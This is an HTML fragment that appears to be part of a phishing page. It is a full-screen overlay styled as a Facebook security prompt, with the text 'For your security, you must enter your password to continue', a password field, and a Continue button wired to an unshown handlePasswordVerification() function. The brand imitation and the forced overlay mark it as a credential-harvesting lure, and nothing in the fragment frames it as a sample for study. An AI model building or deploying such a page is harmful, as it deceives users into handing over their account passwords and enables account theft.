<div class="password-verification" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.2); display: flex; align-items: center; justify-content: center; z-index: 10000">
  <div style="background: #fff; border-radius: 12px; width: 400px; max-width: 95vw; padding: 24px; text-align: center">
    <img src="/assets/img/Untitled.png" alt="Facebook" style="width: 60px; height: 60px; margin-bottom: 16px">
    <h3 style="margin: 0 0 16px 0; color: #1c2b33;">For your security, you must enter your password to continue</h3>
    <div class="password-error" style="color: #c00; margin-bottom: 16px; display: none;"></div>
    <input type="password" id="securityPassword" placeholder="Password" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 16px; box-sizing: border-box;">
    <button onclick="handlePasswordVerification()" style="width: 100%; background: #1877f2; color: #fff; border: none; border-radius: 6px; padding: 12px; font-weight: 600; cursor: pointer">Continue</button>
  </div>
</div>
